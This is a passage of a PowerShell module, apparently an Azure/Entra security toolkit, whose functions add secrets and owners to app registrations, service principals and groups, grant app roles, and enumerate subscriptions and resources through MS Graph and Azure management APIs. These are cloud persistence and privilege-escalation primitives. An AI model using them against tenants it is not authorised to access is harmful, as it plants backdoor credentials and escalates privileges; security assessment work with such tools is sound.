        Creates a new secret for an Entra App Registration which can then be used to authenticate to Azure services as the associated Service Principal

    .PARAMETER AppRegObjectId
        The object ID of the existing Application Registration object

    .PARAMETER Token
        The MS-Graph scoped JWT for a principal with the ability to add a secret to the target app registration

    .EXAMPLE
        C:\PS> $AppRegObjectId = "76add5b8-33fe-4f8f-8afe-8b75ddfaa7ae"
        C:\PS> New-EntraAppSecret `
            -AppRegObjectId $AppRegObjectId
            -Token $Token

        Description
        -----------
        Create a new secret for the Application Registration with object ID of "76add5b8-33fe-4f8f-8afe-8b75ddfaa7ae"

    .EXAMPLE
        C:\PS> New-TestAppReg -DisplayName "MyCoolApp" -Token $GlobalAdminToken.access_token | New-EntraAppSecret -Token $GlobalAdminToken.access_token

        Description
        -----------
        Pipe the result of New-TestAppReg into New-EntraAppSecret, creating a new App Reg and a secret for it in one line

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $AppRegObjectID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    # Get the Application Registration's App ID
    $AppReg = Invoke-RestMethod `
        -Headers        @{Authorization = "Bearer $($Token)" } `
        -URI            "https://graph.microsoft.com/v1.0/applications/$($AppRegObjectID)" `
        -Method         GET `
        -ContentType    'application/json'

    # Add a credential to the app reg
    $body = @{
        displayName = "My cool password"
    }
    $AppRegSecret = Invoke-RestMethod `
        -Headers @{Authorization = "Bearer $($Token)" } `
        -URI            "https://graph.microsoft.com/v1.0/applications/$($AppRegObjectID)/addPassword" `
        -Method         POST `
        -Body           $($body | ConvertTo-Json) `
        -ContentType    'application/json'

    $AppRegSecret = @{
        AppRegObjectId     =    $AppRegObjectId
        AppRegAppId        =    $AppReg.appId
        AppRegSecretValue  =    $AppRegSecret.secretText
    }

    $AppRegSecret
}
New-Variable -Name 'New-EntraAppSecretDefinition' -Value (Get-Command -Name "New-EntraAppSecret") -Force
New-Variable -Name 'New-EntraAppSecretAst' -Value (${New-EntraAppSecretDefinition}.ScriptBlock.Ast.Body) -Force

Function New-EntraServicePrincipalSecret {
    <#
    .SYNOPSIS
        Add a new secret to an existing service principal

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Creates a new secret for an Entra Service Principal which can then be used to authenticate to Azure services as the Service Principal

    .PARAMETER ServicePrincipalID
        The object ID of the existing Service Principal

    .PARAMETER Token
        The MS-Graph scoped JWT for a principal with the ability to add a new secret to the target service principal

    .EXAMPLE
        C:\PS> $ServicePrincipalID = "71c9f3d1-a6ef-4c3a-b5d7-bb668a16a61c"
        C:\PS> New-ServicePrincipalSecret `
            -ServicePrincipalID $ServicePrincipalID
            -Token $Token

        Description
        -----------
        Create a new secret for the Service Principal with object ID of "71c9f3d1-a6ef-4c3a-b5d7-bb668a16a61c"

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $ServicePrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    # Get the Service Principal's App ID
    $ServicePrincipal = Invoke-RestMethod `
        -Headers        @{Authorization = "Bearer $($Token)" } `
        -URI            "https://graph.microsoft.com/v1.0/servicePrincipals/$($ServicePrincipalID)" `
        -Method         GET `
        -ContentType    'application/json'

    # Add a credential to the service principal
    $body = @{
        displayName = "My cool password"
    }
    $ServicePrincipalSecret = Invoke-RestMethod `
        -Headers        @{Authorization = "Bearer $($Token)" } `
        -URI            "https://graph.microsoft.com/v1.0/servicePrincipals/$($ServicePrincipalID)/addPassword" `
        -Method         POST `
        -Body           $($body | ConvertTo-Json) `
        -ContentType    'application/json'

    $ServicePrincipalSecret = @{
        ServicePrincipalObjectId     = $ServicePrincipalID
        ServicePrincipalAppId        = $ServicePrincipal.appId
        ServicePrincipalSecretValue  = $ServicePrincipalSecret.secretText
    }

    $ServicePrincipalSecret
}
New-Variable -Name 'New-EntraServicePrincipalSecretDefinition' -Value (Get-Command -Name "New-EntraServicePrincipalSecret") -Force
New-Variable -Name 'New-EntraServicePrincipalSecretAst' -Value (${New-EntraServicePrincipalSecretDefinition}.ScriptBlock.Ast.Body) -Force

Function New-EntraServicePrincipalOwner {
    <#
    .SYNOPSIS
        Add a new owner to an Entra Service Principal

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Attempts to add a new owner to an Entra Service Principal using the MS Graph API

    .PARAMETER ServicePrincipalObjectID
        The object ID of the target Service Principal - NOT the app id.

    .PARAMETER NewOwnerObjectID
        The object ID of the principial you want to add as a new owner to the target Service Principal

    .PARAMETER Token
        The MS-Graph scoped JWT for a principal with the ability to add an owner to the target Service Principal

    .EXAMPLE
        C:\PS> New-EntraServicePrincipalOwner `
            -ServicePrincipalObjectID 'd9786def-03b9-458a-8ba1-3af3a25745de' `
            -NewOwnerObjectID '834f2b4d-1f9c-4897-92ea-4ecb7fe063a0' `
            -Token $Token

        Description
        -----------
        Attempt to add the principal with ID of '834f2b4d-1f9c-4897-92ea-4ecb7fe063a0' as a new owner
        to the Service Principal with object ID of 'd9786def-03b9-458a-8ba1-3af3a25745de'.

    .INPUTS
        String

    .LINK
        https://learn.microsoft.com/en-us/graph/api/serviceprincipal-post-owners?view=graph-rest-1.0&tabs=http
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $ServicePrincipalObjectID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $NewOwnerObjectID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $body = @{
        "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($NewOwnerObjectID)"
    }
    Invoke-RestMethod `
        -Headers @{Authorization = "Bearer $($Token)" } `
        -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$($ServicePrincipalObjectID)/owners/`$ref" `
        -Method POST `
        -Body $($body | ConvertTo-Json) `
        -ContentType 'application/json'
}
New-Variable -Name 'New-EntraServicePrincipalOwnerDefinition' -Value (Get-Command -Name "New-EntraServicePrincipalOwner") -Force
New-Variable -Name 'New-EntraServicePrincipalOwnerAst' -Value (${New-EntraServicePrincipalOwnerDefinition}.ScriptBlock.Ast.Body) -Force

Function New-EntraAppOwner {
    <#
    .SYNOPSIS
        Add a new owner to an Entra App

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Attempts to add a new owner to an Entra App Registration using the MS Graph API

    .PARAMETER AppObjectID
        The object ID of the target app - NOT the app id.

    .PARAMETER NewOwnerObjectID
        The object ID of the principal you want to add as a new owner to the target App

    .PARAMETER Token
        The MS-Graph scoped JWT for a principal with the ability to add an owner to the target App

    .EXAMPLE
        C:\PS> New-AppOwner `
            -AppObjectID '52114a0d-fa5b-4ee5-9a29-2ba048d46eee' `
            -NewOwnerObjectID '834f2b4d-1f9c-4897-92ea-4ecb7fe063a0' `
            -Token $Token

        Description
        -----------
        Attempt to add the principal with ID of '834f2b4d-1f9c-4897-92ea-4ecb7fe063a0' as a new owner
        to the App with object ID of '52114a0d-fa5b-4ee5-9a29-2ba048d46eee'.

    .INPUTS
        String

    .LINK
        https://learn.microsoft.com/en-us/graph/api/application-post-owners?view=graph-rest-1.0&tabs=http
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $AppObjectID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $NewOwnerObjectID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $body = @{
        "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($NewOwnerObjectID)"
    }
    Invoke-RestMethod `
        -Headers @{Authorization = "Bearer $($Token)" } `
        -Uri "https://graph.microsoft.com/v1.0/applications/$($AppObjectID)/owners/`$ref" `
        -Method POST `
        -Body $($body | ConvertTo-Json) `
        -ContentType 'application/json'
}
New-Variable -Name 'New-EntraAppOwnerDefinition' -Value (Get-Command -Name "New-EntraAppOwner") -Force
New-Variable -Name 'New-EntraAppOwnerAst' -Value (${New-EntraAppOwnerDefinition}.ScriptBlock.Ast.Body) -Force

Function New-EntraGroupOwner {
    <#
    .SYNOPSIS
        Add a new owner to an Entra Group

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Attempts to add a new owner to an Entra Group using the MS Graph API

    .PARAMETER GroupObjectID
        The object ID of the target Group

    .PARAMETER NewOwnerObjectID
        The object ID of the principal you want to add as a new owner to the target Group

    .PARAMETER Token
        The MS-Graph scoped JWT for a principal with the ability to add an owner to the target Group

    .EXAMPLE
        C:\PS> New-EntraGroupOwner `
            -GroupObjectID '352032bf-161d-4788-b77c-b6f935339770' `
            -NewOwnerObjectID '834f2b4d-1f9c-4897-92ea-4ecb7fe063a0' `
            -Token $Token

        Description
        -----------
        Attempt to add the principal with ID of '834f2b4d-1f9c-4897-92ea-4ecb7fe063a0' as a new owner
        to the Group with object ID of '352032bf-161d-4788-b77c-b6f935339770'.

    .INPUTS
        String

    .LINK
        https://learn.microsoft.com/en-us/graph/api/group-post-owners?view=graph-rest-1.0&tabs=http
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GroupObjectID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $NewOwnerObjectID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $body = @{
        "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($NewOwnerObjectID)"
    }
    Invoke-RestMethod `
        -Headers @{Authorization = "Bearer $($Token)" } `
        -Uri "https://graph.microsoft.com/v1.0/groups/$($GroupObjectID)/owners/`$ref" `
        -Method POST `
        -Body $($body | ConvertTo-Json) `
        -ContentType 'application/json'
}
New-Variable -Name 'New-EntraGroupOwnerDefinition' -Value (Get-Command -Name "New-EntraGroupOwner") -Force
New-Variable -Name 'New-EntraGroupOwnerAst' -Value (${New-EntraGroupOwnerDefinition}.ScriptBlock.Ast.Body) -Force

Function New-EntraAppRoleAssignment {
    <#
    .SYNOPSIS
        Grant an App Role assignment to a Service Principal

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Grants an App Role assignment to an existing Entra Service Principal

    .PARAMETER SPObjectID
        The object ID of the existing Entra Service Principal to which you are granting the App Role

    .PARAMETER AppRoleID
        The ID of the App Role you are granting to the Entra Service Principal

    .PARAMETER ResourceID
        The object ID of the Entra resource app (service principal) the App Role is scoped against

    .PARAMETER Token
        The MS-Graph scoped JWT for a principal with the ability to grant app roles

    .EXAMPLE
        C:\PS> New-AppRoleAssignment `
            -SPObjectID "6b6f9289-fe92-4930-a331-9575e0a4c1d8" `
            -AppRoleID "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" `
            -ResourceID "9858020a-4c00-4399-9ae4-e7897a8333fa" `
            -Token $MGToken

        Description
        -----------
        Grant the App Role with ID of "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" to the Service Principal with ObjectID of "6b6f9289-fe92-4930-a331-9575e0a4c1d8"

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SPObjectID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $AppRoleID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $ResourceID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    # Grant the app role to the service principal
    $body = @{
        principalId = $SPObjectID
        resourceId  = $ResourceID
        appRoleId   = $AppRoleID
        startTime   = "2020-01-01T12:00:00Z" # This field is required or the API call will fail. The value does not matter.
        expiryTime  = "2023-01-01T10:00:00Z" # This field is required or the API call will fail. The value does not matter.
    }
    $GrantAppRole = Invoke-RestMethod -Headers @{Authorization = "Bearer $($Token)" } `
        -Uri            "https://graph.microsoft.com/v1.0/servicePrincipals/$($SPObjectID)/appRoleAssignedTo" `
        -Method         POST `
        -Body           $($body | ConvertTo-Json) `
        -ContentType    'application/json'

    $AppRoleAssignment = @{
        AppRoleAssignmentID                     = $GrantAppRole.id
        AppRoleAssignmentAppRoleID              = $GrantAppRole.appRoleId
        AppRoleAssignmentPrincipalDisplayName   = $GrantAppRole.principalDisplayName
        AppRoleAssignmentPrincipalID            = $GrantAppRole.principalId
        AppRoleAssignmentResourceName           = $GrantAppRole.resourceDisplayName
        AppRoleAssignmentResourceObjectID       = $GrantAppRole.resourceId
    }
    $AppRoleAssignment
}
New-Variable -Name 'New-EntraAppRoleAssignmentDefinition' -Value (Get-Command -Name "New-EntraAppRoleAssignment") -Force
New-Variable -Name 'New-EntraAppRoleAssignmentAst' -Value (${New-EntraAppRoleAssignmentDefinition}.ScriptBlock.Ast.Body) -Force

## ############################################ ##
## Azure Resource Manager Enumeration Functions ##
## ############################################ ##

Function Get-AzureRMRoleDefinitions {
    <#
    .SYNOPSIS
        Gets the current list of available AzureRM roles

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Collects all roles available in AzureRM at the subscription object level

    .PARAMETER Token
        An AzureRM scoped JWT for an Entra principal

    .PARAMETER SubscriptionID
        The unique identifier for your target subscription

    .EXAMPLE
        Get-AzureRMRoleDefinitions -Token $ARMToken -SubscriptionID "bf51..."

        Description
        -----------
        List all available AzureRM Role Definitions for the subsription whose ID starts with "bf51..."

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
    )

    $SubscriptionRoles = $null
    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.Authorization/roleDefinitions?api-version=2018-01-01-preview"
    do {
        $Results = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($Token)"} `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $SubscriptionRoles += $Results.value
        } else {
            $SubscriptionRoles += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    ForEach ($Role in $SubscriptionRoles) {
        # Return an object of the AzureRM role
        $AzureRMRole = New-Object PSObject -Property @{
            AzureRMRoleDisplayName  = $Role.properties.roleName
            AzureRMRoleID           = $Role.id
        }
        $AzureRMRole
    }
}

Function Get-AzureRMRoleAssignments {
    <#
    .SYNOPSIS
        Lists all AzureRM role assignments against a specified object

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Lists all AzureRM role assignments against a specified object

    .PARAMETER TargetObjectID
        The ID of the AzureRM object you are listing role assignments of.

    .PARAMETER Token
        The AzureRM scoped JWT for a principal with the ability to read role assignments scoped to the target object.

    .EXAMPLE
        C:\PS> New-AzureRMRoleAssignments `
            -TargetObjectID "f1816681-4df5-4a31-acfa-922401687008" `
            -Token $ARMToken

        Description
        -----------
        List the Azure role assignments scoped to the object whose ID starts with "f18..."

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
        https://docs.microsoft.com/en-us/azure/role-based-access-control/role-assignments-rest
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetObjectID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $URI = "https://management.azure.com/$($TargetObjectID)/providers/Microsoft.Authorization/roleAssignments?api-version=2018-01-01-preview&`$filter=atScope()"

    $AzureRMRoleAssignments = Invoke-RestMethod `
        -Headers        @{Authorization = "Bearer $($Token)"} `
        -URI            $URI `
        -Method         GET `
        -ContentType    'application/json'

    $AzureRMRoleAssignments.value.properties
}

Function Get-AllAzureRMSubscriptions {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure RM subscriptions using the Azure management API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure RM subscriptions using the Azure management API
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list subscriptions
    
    .EXAMPLE
    C:\PS> $Subscriptions = Get-AllAzureRMSubscriptions -Token $Token
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all subscriptions and put them into the $Subscriptions variable
    
    .LINK
        https://learn.microsoft.com/en-us/rest/api/subscription/subscriptions/list?view=rest-subscription-2021-10-01&tabs=HTTP
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
    )

    # Get all subscriptions
    $URI = "https://management.azure.com/subscriptions?api-version=2020-01-01"
    $Results = $null
    $SubscriptionObjects = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
                ConsistencyLevel = "eventual"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $SubscriptionObjects += $Results.value
        } else {
            $SubscriptionObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $SubscriptionObjects
}

Function Get-AllAzureRMResourceGroups {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure RM resource groups under a particular subscription using the Azure management API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure RM resource groups under a particular subscription using the Azure management API
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list resource groups

    .PARAMETER SubscriptionID
        The unique identifier of the subscription you want to list resource groups under
    
    .EXAMPLE
    C:\PS> $ResourceGroups = Get-AllAzureRMResourceGroups -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all resource groups under the subscription with ID starting with "839..." and put them into the $ResourceGroups variable
    
    .LINK
        https://learn.microsoft.com/en-us/rest/api/resources/resource-groups/list?view=rest-resources-2021-04-01
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID
    )

    # Get all resource groups under a specified subscription
    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/resourcegroups?api-version=2021-04-01"
    $Results = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $ResourceGroupObjects += $Results.value
        } else {
            $ResourceGroupObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $ResourceGroupObjects
}

Function Get-AllAzureRMVirtualMachines {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure RM virtual machine objects under a particular subscription using the Azure management API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure RM virtual machine objects under a particular subscription using the Azure management API
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list virtual machines

    .PARAMETER SubscriptionID
        The unique identifier of the subscription you want to list virtual machines under
    
    .EXAMPLE
    C:\PS> $VirtualMachines = Get-AllAzureRMVirtualMachines -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all virtual machines under the subscription with ID starting with "839..." and put them into the $VirtualMachines variable
    
    .LINK
        https://learn.microsoft.com/en-us/rest/api/compute/virtual-machines/list?view=rest-compute-2024-03-01&tabs=HTTP
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID
    )

    # Get all Virtual Machines under a specified subscription
    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.Compute/virtualMachines?api-version=2022-03-01"
    $Results = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $VirtualMachineObjects += $Results.value
        } else {
            $VirtualMachineObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $VirtualMachineObjects
}

Function Get-AllAzureRMLogicApps {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure RM Logic App objects under a particular subscription using the Azure management API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure RM Logic App objects under a particular subscription using the Azure management API
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list Logic Apps

    .PARAMETER SubscriptionID
        The unique identifier of the subscription you want to list Logic Apps under
    
    .EXAMPLE
    C:\PS> $LogicApps = Get-AllAzureRMLogicApps -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all Logic Apps under the subscription with ID starting with "839..." and put them into the $LogicApps variable
    
    .LINK
        https://learn.microsoft.com/en-us/rest/api/logic/workflows/list-by-subscription?view=rest-logic-2016-06-01&tabs=HTTP
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID
    )

    # Get all Logic Apps under a specified subscription
    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.Logic/workflows?api-version=2016-06-01"
    $Results = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $LogicAppObjects += $Results.value
        } else {
            $LogicAppObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $LogicAppObjects
}

Function Get-AllAzureRMFunctionApps {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure RM Function App objects under a particular subscription using the Azure management API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure RM Function App objects under a particular subscription using the Azure management API
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list Function Apps

    .PARAMETER SubscriptionID
        The unique identifier of the subscription you want to list Function Apps under
    
    .EXAMPLE
    C:\PS> $FunctionApps = Get-AllAzureRMFunctionApps -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all Function Apps under the subscription with ID starting with "839..." and put them into the $FunctionApps variable
    
    .LINK
        https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/list?view=rest-appservice-2023-01-01&tabs=HTTP
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID
    )

    # Get all Function Apps under a specified subscription
    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.Web/sites?api-version=2022-03-01"
    $Results = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $FunctionAppObjects += $Results.value
        } else {
            $FunctionAppObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $FunctionAppObjects
}

Function Get-AllAzureRMAzureContainerRegistries {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure RM Container Registry objects under a particular subscription using the Azure management API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure RM Container Registry objects under a particular subscription using the Azure management API
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list Container Registries

    .PARAMETER SubscriptionID
        The unique identifier of the subscription you want to list Container Registries under
    
    .EXAMPLE
    C:\PS> $ContainerRegistries = Get-AllAzureRMAzureContainerRegistries -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all Container Registries under the subscription with ID starting with "839..." and put them into the $ContainerRegistries variable
    
    .LINK
        https://learn.microsoft.com/en-us/rest/api/containerregistry/registries/list?view=rest-containerregistry-2023-01-01-preview&tabs=HTTP
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID
    )

    # Get all Container Registries under a specified subscription
    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.ContainerRegistry/registries?api-version=2023-01-01-preview"
    $Results = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $ContainerRegistryObjects += $Results.value
        } else {
            $ContainerRegistryObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $ContainerRegistryObjects
}

Function Get-AllAzureRMAutomationAccounts {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Automation Accounts under a particular subscription using the Azure management API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Automation Accounts under a particular subscription using the Azure management API
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list Automation Accounts

    .PARAMETER SubscriptionID
        The unique identifier of the subscription you want to list Automation Accounts under
    
    .EXAMPLE
    C:\PS> $AutomationAccounts = Get-AllAzureRMAutomationAccounts -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all Automation Accounts under the subscription with ID starting with "839..." and put them into the $AutomationAccounts variable
    
    .LINK
        https://learn.microsoft.com/en-us/rest/api/automation/automation-account/list?view=rest-automation-2023-11-01&tabs=HTTP
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID
    )

    # Get all Automation Accounts under a specified subscription
    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.Automation/automationAccounts?api-version=2021-06-22"
    $Results = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $AutomationAccountObjects += $Results.value
        } else {
            $AutomationAccountObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

